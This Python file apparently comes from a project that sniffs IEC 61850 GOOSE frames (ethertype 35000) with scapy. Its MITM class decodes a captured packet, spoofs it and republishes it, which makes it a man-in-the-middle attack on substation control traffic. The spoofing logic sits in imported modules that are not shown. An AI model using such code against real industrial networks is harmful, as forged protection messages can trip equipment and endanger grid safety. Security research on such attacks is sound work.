from Publisher import Publisher
from Subscriber import Subscriber
from scapy.all import *

DESTINATION = "01:0c:cd:01:00:33"
TYPE = 35000
IFACE = "Ethernet"
FILTER = "ether proto 35000"

class MITM:
    def __init__(self):
        self.publisher = Publisher()
        self.subscriber = Subscriber(DESTINATION, TYPE, IFACE, FILTER, self.callback)
        self.ignore = False

    def callback(self, packet):
        print(packet)
        if self.ignore:
            return
        # encoded_array = bytearray(raw(packet[Ether].payload.load))

        # hex_array : str = []
        # for byte in encoded_array:
        #     hex_array.append(hex(byte))

        package = self.subscriber.getPackage()
        package.decodePackage(packet.load)
        package.spoof()
        self.publisher.setPackage(package)
        self.ignore = True
        self.publisher.publishEvent()
    
    def sniff(self):
        self.subscriber.sniff()